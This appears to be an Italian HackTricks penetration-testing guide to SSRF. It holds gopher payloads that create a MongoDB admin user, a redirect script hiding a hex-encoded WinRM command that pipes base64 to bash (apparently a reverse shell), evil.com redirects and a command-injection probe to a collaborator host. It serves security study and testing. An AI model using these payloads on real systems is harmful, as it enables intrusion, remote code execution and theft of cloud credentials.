# SSRF (Server Side Request Forgery)

{{#include ../../banners/hacktricks-training.md}}

## Informazioni di base

Una vulnerabilità di tipo **Server-side Request Forgery (SSRF)** si verifica quando un attaccante induce un'applicazione **server-side** a effettuare **HTTP requests** verso un dominio a sua scelta. Questa vulnerabilità espone il server a richieste esterne arbitrarie dirette dall'attaccante.

## Catturare SSRF

La prima cosa da fare è catturare un'interazione SSRF generata da te. Per catturare un'interazione HTTP o DNS puoi usare strumenti come:

- **Burp Collaborator**
- [**pingb**](http://pingb.in)
- [**canarytokens**](https://canarytokens.org/generate)
- [**interractsh**](https://github.com/projectdiscovery/interactsh)
- [**http://webhook.site**](http://webhook.site)
- [**https://github.com/teknogeek/ssrf-sheriff**](https://github.com/teknogeek/ssrf-sheriff)
- [http://requestrepo.com/](http://requestrepo.com/)
- [https://github.com/stolenusername/cowitness](https://github.com/stolenusername/cowitness)
- [https://github.com/dwisiswant0/ngocok](https://github.com/dwisiswant0/ngocok) - A Burp Collaborator using ngrok

## Bypass di domini nella whitelist

Di solito scoprirai che l'SSRF funziona solo in **certi domini o URL nella whitelist**. Nella pagina seguente trovi una **compilazione di tecniche da provare per bypassare quella whitelist**:


{{#ref}}
url-format-bypass.md
{{#endref}}

### Bypass via Open Redirect

Se il server è correttamente protetto potresti comunque **bypassare tutte le restrizioni sfruttando un Open Redirect all'interno della pagina web**. Poiché la pagina permetterà **SSRF verso lo stesso dominio** e probabilmente **seguirà i redirect**, puoi sfruttare l'**Open Redirect per far accedere il server a qualsiasi risorsa interna**.\
Leggi di più qui: [https://portswigger.net/web-security/ssrf]

## Protocolli

- **file://**
- Lo schema URL `file://` è menzionato, puntando direttamente a `/etc/passwd`: `file:///etc/passwd`
- **dict://**
- Lo schema URL `dict://` viene descritto come utilizzato per accedere a definizioni o liste di parole tramite il protocollo DICT. L'esempio illustra un URL costruito che prende di mira una parola specifica, un database e un numero di voce, e un'istanza di uno script php che potrebbe essere potenzialmente usata per connettersi a un server DICT usando credenziali fornite dall'attaccante: `dict://<generic_user>;<auth>@<generic_host>:<port>/d:<word>:<database>:<n>`
- **SFTP://**
- Identificato come protocollo per il trasferimento file sicuro su secure shell, viene fornito un esempio che mostra come uno script php potrebbe essere sfruttato per connettersi a un server SFTP malevolo: `url=sftp://generic.com:11111/`
- **TFTP://**
- Trivial File Transfer Protocol, che opera su UDP, è menzionato con un esempio di uno script php progettato per inviare una richiesta a un server TFTP. Viene fatta una richiesta TFTP a 'generic.com' sulla porta '12346' per il file 'TESTUDPPACKET': `ssrf.php?url=tftp://generic.com:12346/TESTUDPPACKET`
- **LDAP://**
- Questa sezione tratta il Lightweight Directory Access Protocol, enfatizzandone l'uso per gestire e accedere a servizi di informazioni directory distribuite su reti IP. Interagisci con un server LDAP su localhost: `'%0astats%0aquit' via ssrf.php?url=ldap://localhost:11211/%0astats%0aquit.`
- **SMTP**
- Viene descritto un metodo per sfruttare vulnerabilità SSRF per interagire con servizi SMTP su localhost, includendo passaggi per rivelare nomi di dominio interni e ulteriori azioni investigative basate su quelle informazioni.
```
From https://twitter.com/har1sec/status/1182255952055164929
1. connect with SSRF on smtp localhost:25
2. from the first line get the internal domain name 220[ http://blabla.internaldomain.com ](https://t.co/Ad49NBb7xy)ESMTP Sendmail
3. search[ http://internaldomain.com ](https://t.co/K0mHR0SPVH)on github, find subdomains
4. connect
```
- **Curl URL globbing - WAF bypass**
- Se lo SSRF viene eseguito tramite **curl**, curl dispone di una funzionalità chiamata [**URL globbing**](https://everything.curl.dev/cmdline/globbing) che potrebbe essere utile per bypassare i WAF.
- Ad esempio, in questo [**writeup**](https://blog.arkark.dev/2022/11/18/seccon-en/#web-easylfi) trovi un esempio di **path traversal via `file` protocol**:
```
file:///app/public/{.}./{.}./{app/public/hello.html,flag.txt}
```
- **Gopher://**
- Le capacità del protocollo Gopher di specificare IP, porta e byte per la comunicazione col server sono discusse, insieme a strumenti come [Gopherus](https://github.com/tarunkant/Gopherus) e [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser) per creare payload. Vengono illustrate due applicazioni distinte:

### Gopher://

Usando questo protocollo puoi specificare l'**IP, la porta e i byte** che vuoi che il server **invi**. Poi, puoi fondamentalmente sfruttare una SSRF per **comunicare con qualsiasi TCP server** (ma devi prima sapere come parlare al servizio).\
Fortunatamente, puoi usare [Gopherus](https://github.com/tarunkant/Gopherus) per creare payload per diversi servizi. Inoltre, [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser) può essere usato per creare _gopher_ payloads per _Java RMI_ services.

**Gopher smtp**
```
ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a
will make a request like
HELO localhost
MAIL FROM:<hacker@site.com>
RCPT TO:<victim@site.com>
DATA
From: [Hacker] <hacker@site.com>
To: <victime@site.com>
Date: Tue, 15 Sep 2017 17:20:26 -0400
Subject: Ah Ah AHYou didn't say the magic word !
.
QUIT
```
**Gopher HTTP**
```bash
#For new lines you can use %0A, %0D%0A
gopher://<server>:8080/_GET / HTTP/1.0%0A%0A
gopher://<server>:8080/_POST%20/x%20HTTP/1.0%0ACookie: eatme%0A%0AI+am+a+post+body
```
**Gopher SMTP — Back connect to 1337**
```php:redirect.php
<?php
header("Location: gopher://hack3r.site:1337/_SSRF%0ATest!");
?>Now query it.
https://example.com/?q=http://evil.com/redirect.php.
```
#### Gopher MongoDB -- Crea utente con username=admin, password=admin123 e permesso=administrator
```bash
# Check: https://brycec.me/posts/dicectf_2023_challenges#unfinished
curl 'gopher://0.0.0.0:27017/_%a0%00%00%00%00%00%00%00%00%00%00%00%dd%0
7%00%00%00%00%00%00%00%8b%00%00%00%02insert%00%06%00%00%00users%00%02$db%00%0a
%00%00%00percetron%00%04documents%00V%00%00%00%030%00N%00%00%00%02username%00%
06%00%00%00admin%00%02password%00%09%00%00%00admin123%00%02permission%00%0e%00
%00%00administrator%00%00%00%00'
```
## SSRF tramite Referrer header e altri

Il software di analytics sui server spesso registra il Referrer header per tracciare i link in ingresso, una pratica che espone involontariamente le applicazioni a vulnerabilità di Server-Side Request Forgery (SSRF). Questo perché tale software può visitare URL esterni menzionati nel Referrer header per analizzare il contenuto del sito di referral. Per scoprire queste vulnerabilità, è consigliato il plugin di Burp Suite "**Collaborator Everywhere**", che sfrutta il modo in cui gli strumenti di analytics elaborano il Referer header per identificare potenziali superfici di attacco SSRF.

## SSRF via SNI data from certificate

Una misconfigurazione che potrebbe consentire la connessione a qualsiasi backend tramite una configurazione semplice è illustrata con un esempio di configurazione Nginx:
```
stream {
server {
listen 443;
resolver 127.0.0.11;
proxy_pass $ssl_preread_server_name:443;
ssl_preread on;
}
}
```
In questa configurazione, il valore del campo Server Name Indication (SNI) viene utilizzato direttamente come indirizzo del backend. Questa impostazione espone a una vulnerabilità di Server-Side Request Forgery (SSRF), che può essere sfruttata semplicemente specificando l'indirizzo IP o il nome di dominio desiderato nel campo SNI. Un esempio di sfruttamento per forzare una connessione a un backend arbitrario, come `internal.host.com`, usando il comando `openssl`, è riportato di seguito:
```bash
openssl s_client -connect target.com:443 -servername "internal.host.com" -crlf
```
## SSRF via TLS AIA CA Issuers (Java mTLS)

Alcune stack TLS scaricano automaticamente le CA intermedie mancanti usando l'URI **Authority Information Access (AIA) → CA Issuers** presente nel certificato del peer. In **Java**, abilitare `-Dcom.sun.security.enableAIAcaIssuers=true` mentre si esegue un servizio mTLS fa sì che il server dereferenzi URI controllati dall'attaccante provenienti dal certificato client **durante lo handshake**, prima che venga eseguita qualsiasi logica HTTP.

- **Requirements**: mTLS abilitato, Java AIA fetching abilitato, l'attaccante può presentare un certificato client con un AIA CA Issuers URI creato ad arte.
- **Triggering SSRF** (Java 21 example):
```bash
java -Djava.security.debug=certpath \
-Dcom.sun.security.enableAIAcaIssuers=true \
-Dhttp.agent="AIA CA Issuers PoC" -jar server.jar
# Attacker cert AIA: http://localhost:8080
nc -l 8080 -k                      # observe the outbound fetch
curl https://mtls-server:8444 --key client-aia-key.pem --cert client-aia-localhost-cert.pem --cacert ca-cert.pem
```
L'output di debug certpath di Java mostra `CertStore URI:http://localhost:8080`, e `nc` cattura la richiesta HTTP con il `User-Agent` controllabile da `-Dhttp.agent`, dimostrando SSRF durante la validazione del certificato.
- **DoS via file://**: impostare AIA CA Issuers su `file:///dev/urandom` su host Unix-like fa sì che Java lo tratti come un CertStore e legga byte casuali senza limiti, tenendo occupato un core CPU e bloccando connessioni successive anche dopo la disconnessione del client.

## SSRF via CSS Pre-Processors

LESS è un popolare CSS pre-processor che aggiunge variabili, mixin, funzioni e il potente direttiva `@import`. Durante la compilazione il motore LESS **recupera le risorse referenziate nelle direttive `@import`** e incorpora ("inline") i loro contenuti nel CSS risultante quando viene usata l'opzione `(inline)`.

Controlla come sfruttarlo in:

{{#ref}}
../xs-search/css-injection/less-code-injection.md
{{#endref}}


## [Wget file upload](../file-upload/index.html#wget-file-upload-ssrf-trick)

## SSRF with Command Injection

Potrebbe valere la pena provare un payload come: `` url=http://3iufty2q67fuy2dew3yug4f34.burpcollaborator.net?`whoami` ``

## Rendering di PDF

Se la pagina web crea automaticamente un PDF con alcune informazioni che hai fornito, puoi **inserire del JS che verrà eseguito dal creatore del PDF** stesso (il server) durante la creazione del PDF e potrai abusare di una SSRF. [**Find more information here**](../xss-cross-site-scripting/server-side-xss-dynamic-pdf.md)**.**

## From SSRF to DoS

Crea diverse sessioni e prova a scaricare file pesanti sfruttando la SSRF dalle sessioni.

## SSRF PHP Functions

Controlla la pagina seguente per funzioni PHP vulnerabili e anche funzioni di Wordpress:


{{#ref}}
../../network-services-pentesting/pentesting-web/php-tricks-esp/php-ssrf.md
{{#endref}}

## SSRF Redirect to Gopher

Per alcuni sfruttamenti potresti aver bisogno di **inviare una risposta di redirect** (potenzialmente per usare un protocollo diverso come gopher). Qui trovi diversi codici python per rispondere con un redirect:
```python
# First run: openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

class MainHandler(BaseHTTPRequestHandler):
def do_GET(self):
print("GET")
self.send_response(301)
self.send_header("Location", "gopher://127.0.0.1:5985/_%50%4f%53%54%20%2f%77%73%6d%61%6e%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20%31%30%2e%31%30%2e%31%31%2e%31%31%37%3a%35%39%38%36%0d%0a%55%73%65%72%2d%41%67%65%6e%74%3a%20%70%79%74%68%6f%6e%2d%72%65%71%75%65%73%74%73%2f%32%2e%32%35%2e%31%0d%0a%41%63%63%65%70%74%2d%45%6e%63%6f%64%69%6e%67%3a%20%67%7a%69%70%2c%20%64%65%66%6c%61%74%65%0d%0a%41%63%63%65%70%74%3a%20%2a%2f%2a%0d%0a%43%6f%6e%6e%65%63%74%69%6f%6e%3a%20%63%6c%6f%73%65%0d%0a%43%6f%6e%74%65%6e%74%2d%54%79%70%65%3a%20%61%70%70%6c%69%63%61%74%69%6f%6e%2f%73%6f%61%70%2b%78%6d%6c%3b%63%68%61%72%73%65%74%3d%55%54%46%2d%38%0d%0a%43%6f%6e%74%65%6e%74%2d%4c%65%6e%67%74%68%3a%20%31%37%32%38%0d%0a%0d%0a%3c%73%3a%45%6e%76%65%6c%6f%70%65%20%78%6d%6c%6e%73%3a%73%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%77%33%2e%6f%72%67%2f%32%30%30%33%2f%30%35%2f%73%6f%61%70%2d%65%6e%76%65%6c%6f%70%65%22%20%78%6d%6c%6e%73%3a%61%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%38%2f%61%64%64%72%65%73%73%69%6e%67%22%20%78%6d%6c%6e%73%3a%68%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%6d%69%63%72%6f%73%6f%66%74%2e%63%6f%6d%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%69%6e%64%6f%77%73%2f%73%68%65%6c%6c%22%20%78%6d%6c%6e%73%3a%6e%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%39%2f%65%6e%75%6d%65%72%61%74%69%6f%6e%22%20%78%6d%6c%6e%73%3a%70%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%6d%69%63%72%6f%73%6f%66%74%2e%63%6f%6d%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%73%6d%61%6e%2e%78%73%64%22%20%78%6d%6c%6e%73%3a%77%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%73%6d%61%6e%2e%78%73%64%22%20%78%6d%6c%6e%73%3a%78%73%69%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%77%33%2e%6f%72%67%2f%32%30%30%31%2f%58%4d%4c%53%63%68%65%6d%61%22%3e%0a%20%20%20%3c%73%3a%48%65%61%64%65%72%3e%0a%20%20%20%20%20%20%3c%61%3a%54%6f%3e%48%54%54%50%3a%2f%2f%31%39%32%2e%31%36%38%2e%31%2e%31%3a%35%39%38%36%2f%77%73%6d%61%6e%2f%3c%2f%61%3a%54%6f%3e%0a%20%20%20%20%20%20%3c%77%3a%52%65%73%6f%75%72%63%65%55%52%49%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%3c%2f%77%3a%52%65%73%6f%75%72%63%65%55%52%49%3e%0a%20%20%20%20%20%20%3c%61%3a%52%65%70%6c%79%54%6f%3e%0a%20%20%20%20%20%20%20%20%20%3c%61%3a%41%64%64%72%65%73%73%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%38%2f%61%64%64%72%65%73%73%69%6e%67%2f%72%6f%6c%65%2f%61%6e%6f%6e%79%6d%6f%75%73%3c%2f%61%3a%41%64%64%72%65%73%73%3e%0a%20%20%20%20%20%20%3c%2f%61%3a%52%65%70%6c%79%54%6f%3e%0a%20%20%20%20%20%20%3c%61%3a%41%63%74%69%6f%6e%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%2f%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%3c%2f%61%3a%41%63%74%69%6f%6e%3e%0a%20%20%20%20%20%20%3c%77%3a%4d%61%78%45%6e%76%65%6c%6f%70%65%53%69%7a%65%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%31%30%32%34%30%30%3c%2f%77%3a%4d%61%78%45%6e%76%65%6c%6f%70%65%53%69%7a%65%3e%0a%20%20%20%20%20%20%3c%61%3a%4d%65%73%73%61%67%65%49%44%3e%75%75%69%64%3a%30%41%42%35%38%30%38%37%2d%43%32%43%33%2d%30%30%30%35%2d%30%30%30%30%2d%30%30%30%30%30%30%30%31%30%30%30%30%3c%2f%61%3a%4d%65%73%73%61%67%65%49%44%3e%0a%20%20%20%20%20%20%3c%77%3a%4f%70%65%72%61%74%69%6f%6e%54%69%6d%65%6f%75%74%3e%50%54%31%4d%33%30%53%3c%2f%77%3a%4f%70%65%72%61%74%69%6f%6e%54%69%6d%65%6f%75%74%3e%0a%20%20%20%20%20%20%3c%77%3a%4c%6f%63%61%6c%65%20%78%6d%6c%3a%6c%61%6e%67%3d%22%65%6e%2d%75%73%22%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%66%61%6c%73%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%70%3a%44%61%74%61%4c%6f%63%61%6c%65%20%78%6d%6c%3a%6c%61%6e%67%3d%22%65%6e%2d%75%73%22%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%66%61%6c%73%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%77%3a%4f%70%74%69%6f%6e%53%65%74%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%77%3a%53%65%6c%65%63%74%6f%72%53%65%74%3e%0a%20%20%20%20%20%20%20%20%20%3c%77%3a%53%65%6c%65%63%74%6f%72%20%4e%61%6d%65%3d%22%5f%5f%63%69%6d%6e%61%6d%65%73%70%61%63%65%22%3e%72%6f%6f%74%2f%73%63%78%3c%2f%77%3a%53%65%6c%65%63%74%6f%72%3e%0a%20%20%20%20%20%20%3c%2f%77%3a%53%65%6c%65%63%74%6f%72%53%65%74%3e%0a%20%20%20%3c%2f%73%3a%48%65%61%64%65%72%3e%0a%20%20%20%3c%73%3a%42%6f%64%79%3e%0a%20%20%20%20%20%20%3c%70%3a%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%5f%49%4e%50%55%54%20%78%6d%6c%6e%73%3a%70%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%22%3e%0a%20%20%20%20%20%20%20%20%20%3c%70%3a%63%6f%6d%6d%61%6e%64%3e%65%63%68%6f%20%2d%6e%20%59%6d%46%7a%61%43%41%74%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%78%4d%43%34%78%4d%43%34%78%4e%43%34%78%4d%53%38%35%4d%44%41%78%49%44%41%2b%4a%6a%45%3d%20%7c%20%62%61%73%65%36%34%20%2d%64%20%7c%20%62%61%73%68%3c%2f%70%3a%63%6f%6d%6d%61%6e%64%3e%0a%20%20%20%20%20%20%20%20%20%3c%70%3a%74%69%6d%65%6f%75%74%3e%30%3c%2f%70%3a%74%69%6d%65%6f%75%74%3e%0a%20%20%20%20%20%20%3c%2f%70%3a%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%5f%49%4e%50%55%54%3e%0a%20%20%20%3c%2f%73%3a%42%6f%64%79%3e%0a%3c%2f%73%3a%45%6e%76%65%6c%6f%70%65%3e%0a")
self.end_headers()

httpd = HTTPServer(('0.0.0.0', 443), MainHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="server.pem", server_side=True)
httpd.serve_forever()
```

```python
from flask import Flask, redirect
from urllib.parse import quote
app = Flask(__name__)

@app.route('/')
def root():
return redirect('gopher://127.0.0.1:5985/_%50%4f%53%54%20%2f%77%73%6d%61%6e%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20', code=301)

if __name__ == "__main__":
app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
```
## Proxy mal configurati per SSRF

Trucchi [**da questo post**](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies).

### Flask

<details>

<summary>Codice del proxy Flask vulnerabile</summary>
```python
from flask import Flask
from requests import get

app = Flask('__main__')
SITE_NAME = 'https://google.com'

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')

def proxy(path):
return get(f'{SITE_NAME}{path}').content

if __name__ == "__main__":
app.run(threaded=False)
```
</details>

Flask permette di usare **`@`** come carattere iniziale, il che consente di impostare il **nome host iniziale come username** e di iniettarne uno nuovo. Richiesta di attacco:
```http
GET @evildomain.com/ HTTP/1.1
Host: target.com
Connection: close
```
### Spring Boot <a href="#heading-ssrf-on-spring-boot-through-incorrect-pathname-interpretation" id="heading-ssrf-on-spring-boot-through-incorrect-pathname-interpretation"></a>

Codice vulnerabile:

<figure><img src="../../images/image (1201).png" alt=""><figcaption></figcaption></figure>

Si è scoperto che è possibile iniziare il percorso di una richiesta con il carattere **`;`**, il quale permette poi di utilizzare **`@`** e iniettare un nuovo host da raggiungere. Richiesta di attacco:
```http
GET ;@evil.com/url HTTP/1.1
Host: target.com
Connection: close
```
### Server Web incorporato di PHP <a href="#heading-php-built-in-web-server-case-study-ssrf-through-incorrect-pathname-interpretation" id="heading-php-built-in-web-server-case-study-ssrf-through-incorrect-pathname-interpretation"></a>

<details>

<summary>Codice PHP vulnerabile</summary>
```php
<?php
$site = "http://ifconfig.me";
$current_uri = $_SERVER['REQUEST_URI'];

$proxy_site = $site.$current_uri;
var_dump($proxy_site);

echo "\n\n";

$response = file_get_contents($proxy_site);
var_dump($response);
?>
```
</details>

PHP consente l'uso del **carattere `*` prima di uno slash nel percorso** dell'URL, tuttavia presenta altre limitazioni, ad esempio può essere usato solo per il pathname root `/` e i punti `.` non sono consentiti prima del primo slash, quindi è necessario utilizzare, ad esempio, un indirizzo IP codificato in esadecimale senza punti:
```http
GET *@0xa9fea9fe/ HTTP/1.1
Host: target.com
Connection: close
```
## DNS Rebidding CORS/SOP bypass

Se hai dei **problemi** a **esfiltrare contenuti da un IP locale** a causa di **CORS/SOP**, **DNS Rebidding** può essere usato per bypassare quella limitazione:


{{#ref}}
../cors-bypass.md
{{#endref}}

### DNS Rebidding automatizzato

[**`Singularity of Origin`**](https://github.com/nccgroup/singularity) è uno strumento per effettuare attacchi di [DNS rebinding](https://en.wikipedia.org/wiki/DNS_rebinding). Include i componenti necessari per riassegnare l'indirizzo IP del nome DNS del server di attacco all'indirizzo IP della macchina target e per servire payload di attacco per sfruttare software vulnerabili sulla macchina target.

Dai un'occhiata anche al **server pubblico in funzione su** [**http://rebind.it/singularity.html**](http://rebind.it/singularity.html)

## DNS Rebidding + TLS Session ID/Session ticket

Requisiti:

- **SSRF**
- **Sessioni TLS in uscita**
- **Servizi su porte locali**

Attacco:

1. Induci l'utente/bot ad **accedere** a un **domain** controllato dall'**attacker**
2. Il **TTL** del **DNS** è **0** sec (così la vittima controllerà di nuovo l'IP del domain a breve)
3. Viene creata una **TLS connection** tra la vittima e il domain dell'attacker. L'attacker inserisce il **payload all'interno** dello **Session ID o Session Ticket**.
4. Il **domain** inizierà un **loop infinito** di redirect contro se stesso. L'obiettivo è far sì che l'utente/bot acceda ripetutamente al domain finché non effettuerà **di nuovo** una **DNS request** per il domain.
5. Nella DNS request viene ora fornito un indirizzo **IP privato** (ad esempio 127.0.0.1)
6. L'utente/bot tenterà di **ristabilire la TLS connection** e per farlo invierà lo **Session ID/Session Ticket ID** (dove era contenuto il **payload** dell'attacker). Quindi congratulazioni: sei riuscito a far sì che l'**utente/bot si attacchi da solo**.

Nota che durante questo attacco, se vuoi attaccare localhost:11211 (_memcache_) devi fare in modo che la vittima stabilisca la connessione iniziale con www.attacker.com:11211 (la **porta deve essere sempre la stessa**).  
Per **eseguire questo attacco puoi usare lo strumento**: [https://github.com/jmdx/TLS-poison/](https://github.com/jmdx/TLS-poison/)  
Per **maggiori informazioni** dai un'occhiata al talk dove questo attacco è spiegato: [https://www.youtube.com/watch?v=qGpAJxfADjo\&ab_channel=DEFCONConference](https://www.youtube.com/watch?v=qGpAJxfADjo&ab_channel=DEFCONConference)

## Blind SSRF

La differenza tra una blind SSRF e una non-blind è che nella blind non puoi vedere la risposta della richiesta SSRF. Quindi è più difficile da sfruttare perché potrai sfruttare solo vulnerabilità ben note.

### Time based SSRF

**Controllando il tempo** delle risposte dal server potrebbe essere **possibile sapere se una risorsa esiste o meno** (potrebbe richiedere più tempo accedere a una risorsa esistente rispetto a una che non esiste)

### From blid to full abusing status codes

Secondo questo [**blog post**](https://slcyber.io/assetnote-security-research-center/novel-ssrf-technique-involving-http-redirect-loops/), alcune blind SSRF possono verificarsi perché anche se l'URL target risponde con un codice di stato 200 (come AWS metadata), questi dati non sono formattati correttamente e pertanto l'app potrebbe rifiutarsi di mostrarli.

Tuttavia, è stato scoperto che inviando alcune risposte di redirect dai codici 305 a 309 nella SSRF può essere possibile far sì che l'applicazione **segua questi redirect entrando in una modalità di errore** che non controllerà più il formato dei dati e potrebbe semplicemente stamparli.

Il server python usato per sfruttare questo è il seguente:
```python
@app.route("/redir")
def redir():
count = int(request.args.get("count", 0)) + 1
# Pump out 305, 306, 307, 308, 309, 310 ...
weird_status = 301 + count
if count >= 10:                      # after 5 “weird” codes
return redirect(METADATA_URL, 302)
return redirect(f"/redir?count={count}", weird_status)

@app.route("/start")
def start():
return redirect("/redir", 302)
```
**Passaggi:**
- Prima un 302 fa partire l'app nello follow.
- Poi riceve 305 → 306 → 307 → 308 → 309 → 310.
- Dopo il 5° codice strano il PoC finalmente ritorna 302 → 169.254.169.254 → 200 OK.

**Cosa succede all'interno dell'obiettivo:**
- libcurl di per sé segue i 305–310; normalizza semplicemente i codici sconosciuti in “follow.”
- Dopo N redirect strani (≥ 5 qui) il wrapper dell'applicazione decide che “qualcosa non va” e passa in una modalità di errore pensata per il debugging.
- In quella modalità scarica l'intera catena di redirect più il body finale e li restituisce al chiamante esterno.
- Risultato: l'attacker vede ogni header + il metadata JSON, missione compiuta.

Nota che questo è utile per il leak di codici di stato che prima non potevi ottenere (come un 200). Tuttavia, se in qualche modo potessi anche selezionare il codice di stato della risposta (immagina di poter far sì che la AWS metadata risponda con un 500), **potrebbero esserci alcuni codici di stato che rivelano direttamente il contenuto della risposta.**

### Renderer HTML-to-PDF come gadget SSRF ciechi

Librerie come **TCPDF** (e wrapper come **spipu/html2pdf**) fetcheranno automaticamente qualsiasi URL presente in HTML controllato dall'attacker durante il rendering di un PDF. Ogni attributo `<img>` o `<link rel="stylesheet">` viene risolto server-side via cURL, `getimagesize()`, o `file_get_contents()`, quindi puoi usare il worker PDF per sondare host interni anche se nessuna risposta HTTP viene riflessa verso di te.
```
<html>
<body>
<img width="1" height="1" src="http://127.0.0.1:8080/healthz">
<link rel="stylesheet" type="text/css" href="http://10.0.0.5/admin" />
</body>
</html>
```
- TCPDF 6.10.0 effettua diversi tentativi di recupero per ogni risorsa `<img>`, quindi un singolo payload può generare richieste multiple (utile per port scan basati sul timing).
- html2pdf riproduce il comportamento di TCPDF per `<img>` e aggiunge il recupero CSS dentro `Css::extractStyle()`, che semplicemente chiama `file_get_contents($href)` dopo un controllo superficiale dello scheme. Abusane per colpire servizi loopback, intervalli RFC1918 o endpoint di metadata cloud.
- Combine this SSRF primitive with the [HTML-to-PDF path traversal tricks](../file-inclusion/README.md#html-to-pdf-svgimg-path-traversal) to leak both internal HTTP responses and local files rendered into the PDF.

Chi effettua hardening dovrebbe rimuovere gli URL esterni prima del rendering o isolare il renderer in una sandbox di rete; fino ad allora, trattare i generatori di PDF come blind SSRF proxies.

## Sfruttamento SSRF in ambiente cloud

Se trovi una vulnerabilità SSRF in una macchina che gira in un ambiente cloud potresti essere in grado di ottenere informazioni interessanti sull'ambiente cloud e persino credenziali:


{{#ref}}
cloud-ssrf.md
{{#endref}}

## Piattaforme vulnerabili a SSRF

Diverse piattaforme note contengono o hanno contenuto vulnerabilità SSRF, consultale in:


{{#ref}}
ssrf-vulnerable-platforms.md
{{#endref}}

## Strumenti

### [**SSRFMap**](https://github.com/swisskyrepo/SSRFmap)

Strumento per rilevare e sfruttare vulnerabilità SSRF

### [Gopherus](https://github.com/tarunkant/Gopherus)

- [Blog post on Gopherus](https://spyclub.tech/2018/08/14/2018-08-14-blog-on-gopherus/)

This tool generates Gopher payloads for:

- MySQL
- PostgreSQL
- FastCGI
- Redis
- Zabbix
- Memcache

### [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser)

- [Blog post on SSRF usage](https://blog.tneitzel.eu/posts/01-attacking-java-rmi-via-ssrf/)

_remote-method-guesser_ è uno scanner di vulnerabilità _Java RMI_ che supporta operazioni di attacco per le più comuni vulnerabilità _Java RMI_. La maggior parte delle operazioni disponibili supporta l'opzione `--ssrf`, per generare un payload _SSRF_ per l'operazione richiesta. Insieme all'opzione `--gopher`, possono essere generati direttamente payload _gopher_ pronti all'uso.

### [SSRF Proxy](https://github.com/bcoles/ssrf_proxy)

SSRF Proxy è un server proxy HTTP multi-thread progettato per instradare il traffico HTTP del client attraverso server HTTP vulnerabili a Server-Side Request Forgery (SSRF).

### To practice


{{#ref}}
https://github.com/incredibleindishell/SSRF_Vulnerable_Lab
{{#endref}}

## Riferimenti

